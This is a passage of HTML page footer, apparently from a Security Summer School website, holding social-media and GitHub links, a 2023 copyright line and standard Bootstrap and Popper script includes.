fa-facebook"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Youtube aria-label=Youtube><a class=text-white target=_blank rel=noopener href=https://bit.ly/YoutubeSecuritySummerSchool aria-label=Youtube><i class="fab fa-youtube"></i></a></li></ul></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/security-summer-school aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2023 Open-Source Contributors. All Rights Reserved</small></div></div></div></footer></div><script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js integrity="sha512-UR25UO94eTnCVwjbXozyeVd6ZqpaAE9naiEUBK/A+QDbfSTQFhPGj5lOR6d8tsgbBk84Ggb5A3EkjsOgPRPcKA==" crossorigin=anonymous></script>
<script src=/js/tabpane-persist.js></script>
<script src=/js/main.min.aa9f4c5dae6a98b2c46277f4c56f1673a2b000d1756ce4ffae93784cab25e6d5.js integrity="sha256-qp9MXa5qmLLEYnf0xW8Wc6KwANF1bOT/rpN4TKsl5tU=" crossorigin=anonymous></script></body></html>